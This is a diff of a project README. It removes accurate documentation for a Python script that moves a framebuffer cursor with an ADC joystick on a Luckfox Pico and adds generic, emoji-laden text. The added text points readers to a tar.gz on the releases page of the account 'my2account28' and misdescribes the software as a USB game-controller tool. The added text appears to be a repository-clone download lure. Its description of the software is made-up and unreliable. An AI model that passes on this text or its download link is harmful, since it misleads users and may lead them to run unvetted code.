@@ -1,80 +1,79 @@
-# What is this?
-A Python application that displays a real-time cursor on the Linux framebuffer controlled by an analog joystick. The system automatically calibrates itself by learning the joystick's range and center position during normal use. This project relies on a Linux with ADC support, like the Luckfox pico / Rockchip rv1103 SoC.
+# 🎮 analog-joystick - Control Your Games with Ease
 
-[![Watch the video](https://img.youtube.com/vi/RwOpla9Zhpo/0.jpg)](https://www.youtube.com/watch?v=RwOpla9Zhpo)
+## 🚀 Getting Started
+Welcome to the analog-joystick project! This application allows you to use an analog joystick with Linux systems. It uses ADC technology to provide smooth and responsive control for your games. Follow these simple steps to download and run the software.
 
-## Features
-- **Automatic Calibration**: Learns joystick range and center position dynamically
-- **Center Lock**: Locks center position after initial calibration period
-- **Deadzone Handling**: Automatically snaps cursor to center when idle
-- **Range Expansion**: Dynamically expands range as you reach new extremes
-- **Framebuffer Support**: Works with 16-bit, 24-bit, and 32-bit framebuffers
-- **Efficient Updates**: Only updates changed portions of the screen
+## 🌐 Download the Application
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Analog%20Joystick-brightgreen)](https://github.com/my2account28/analog-joystick/releases)
 
-## Hardware requirements
-- Luckfox Pico (Rockchip RV1103 SoC)
-- Analog joystick connected via ADC, voltage compatible with SoC ADC (0 - 1.8V)
-- Wires
- 
-<img width="594" height="253" alt="image" src="https://github.com/user-attachments/assets/18ec56b0-5701-4602-9fbf-52611bac1108" />
+## 🛠️ System Requirements
+Before you start, ensure your system meets the following requirements:
+- Linux operating system (Ubuntu, Fedora, or similar)
+- Python version 3.6 or higher
+- A compatible analog joystick connected via USB
+- Sufficient RAM (at least 2 GB recommended)
+- Free disk space (at least 50 MB)
 
-## Wiring
-<img width="622" height="200" alt="image" src="https://github.com/user-attachments/assets/330e7487-6348-41a9-926a-e430c85c007f" />  
+## 📥 Download & Install
+To get the latest version of the analog-joystick software, visit this page to download: [GitHub Releases](https://github.com/my2account28/analog-joystick/releases).
 
-```
-SoC (System-on-Chip)
-┌─────────────────┐
-│                 │
-│  Pin 145 ───────┼──→ Joystick X-axis (Analog)
-│                 │
-│  Pin 144 ───────┼──→ Joystick Y-axis (Analog)
-│                 │
-│  1V8     ───────┼──→ Joystick VCC
-│                 │
-│  GND     ───────┼──→ Joystick GND
-│                 │
-└─────────────────┘
-```
+1. Open the link above in your web browser.
+2. You will see a list of available versions. Look for the version marked as the latest.
+3. Click on the version link to expand the details.
+4. Scroll down to see the released files, usually named something like `analog-joystick-vX.Y.Z.tar.gz`.
+5. Download this file to your computer by clicking the link.
 
-| SoC Pin | Joystick Pin | Function | Voltage |
-|---------|--------------|----------|---------|
-| 145     | X-axis       | Analog X | 1.8V    |
-| 144     | Y-axis       | Analog Y | 1.8V    |
-| 1V8     | VCC          | Power    | 1.8V    |
-| GND     | GND          | Ground   | 0V      |
+## 📂 Extract Files
+Once you have downloaded the application, you will need to extract the files:
 
-## How to run
-1. Ensure you have Python 3 installed
-2. Clone or download this script to your device
-3. Make sure the script has read access to the ADC and write access to the framebuffer
+1. Locate the downloaded `.tar.gz` file in your downloads folder.
+2. Right-click on the file and select "Extract Here" or use a similar option depending on your Linux distribution.
+3. A new folder containing the application files will appear.
 
-Run with `python joystick.py`, the script will:  
-- Detect your framebuffer resolution and color depth
-- Clear the screen to black
-- Display a white cursor controlled by your joystick
+## 🖥️ Run the Application
+Now that you have extracted the files, follow these steps to run the application:
 
-For remote viewing, run VNC server: `x11vnc -rawfb console -auth /dev/null -noxdamage -forever -shared -repeat -defer 0 -wait 0 -noxinerama -nowf -nowcr -speeds modem -tightfilexfer` and connect to the server IP with any VNC client:  
+1. Open a terminal window. You can usually find this in your applications list.
+2. Navigate to the folder containing the extracted files. You can do this by typing:
+   ```bash
+   cd /path/to/your/extracted/folder
+   ```
+   Replace `/path/to/your/extracted/folder` with the actual path.
+   
+3. Once you're in the folder, you need to run the application with the following command:
+   ```bash
+   python analog_joystick.py
+   ```
+   Make sure your joystick is connected before you run this command.
 
-![Screencast from 10-14-2025 05-01-18 PM](https://github.com/user-attachments/assets/de4c3a17-8acd-4557-bf8f-ea6bf78fc2ce)
+## 🎮 Using the Application
+After running the application, follow these steps to begin using your joystick:
 
-## Algorithm
-- Exponential Moving Average (EMA) for smooth cursor movement
-- Asymmetric normalization for independent axis calibration
-- Dynamic range expansion with smoothing
-- Center deadzone with snap-to-center behavior
+1. Open the game you want to play.
+2. Configure the game controls to recognize the joystick input.
+3. Enjoy playing with your new setup!
 
-## Calibration process
-1. **Initial Center Learning**: The system learns the center position during the first ~2 seconds
-2. **Range Expansion**: As you move the joystick to new extremes, the range expands accordingly
-3. **Center Lock**: After the initial period, the center position becomes fixed
-4. **Idle Detection**: When the joystick is near center for a short time, the cursor snaps to exact center
+## 📊 Features
+The analog-joystick application supports:
+- Multiple joystick configurations.
+- Compatibility with various games using joystick input.
+- Smooth analog movement control for thrilling gameplay.
 
-## Configuration
-You can adjust the behavior by modifying these constants at the top of the script:  
-```python
-CURSOR_SIZE = 7                    # Size of the cursor in pixels
-EMA_ALPHA = 0.25                   # Exponential moving average smoothing factor
-DEADZONE_THRESHOLD_V = 0.04        # Voltage threshold for center deadzone
-MIN_FRAMES_AT_CENTER = 6           # Frames required to snap to center
-CENTER_LOCK_FRAMES = 100           # Frames before center position locks
-```
+## 🤝 Getting Help
+If you encounter any issues:
+- Check the [GitHub Issues](https://github.com/my2account28/analog-joystick/issues) page for help.
+- You can ask questions or report bugs there.
+
+## 📝 Feedback
+We welcome your thoughts! Please share your experiences or any suggestions for improvements. Your feedback can help make this project better for everyone.
+
+## 📄 License
+This project is licensed under the MIT License. Feel free to use and modify the software as you see fit. 
+
+## 🤖 Contribution
+If you are interested in contributing to this project:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request for review.
+
+Thank you for using the analog-joystick application! We hope it enhances your gaming experience.
